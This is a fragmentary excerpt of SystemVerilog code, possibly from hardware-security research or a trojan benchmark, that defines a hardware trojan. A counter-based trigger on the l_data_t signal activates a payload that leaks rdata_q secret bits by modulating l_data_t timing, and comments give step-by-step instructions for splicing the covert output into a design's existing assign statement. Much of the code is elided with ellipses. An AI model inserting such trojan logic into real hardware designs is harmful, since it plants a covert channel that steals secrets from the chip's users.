 ...
 *   
 * Trigger: Counter on l_data_t
 * Payload: Modulate l_data_t timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |l_data_t) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of l_data_t:
...
logic       covert_bit_out;         // Drives l_data_t when trojan active
...
//   Find the assign for l_data_t (or rd_error_o as fallback):
//     assign l_data_t = <normal_expr>;
//   Replace with:
//     assign l_data_t = trojan_active ? covert_bit_out : (<normal_expr>);
//
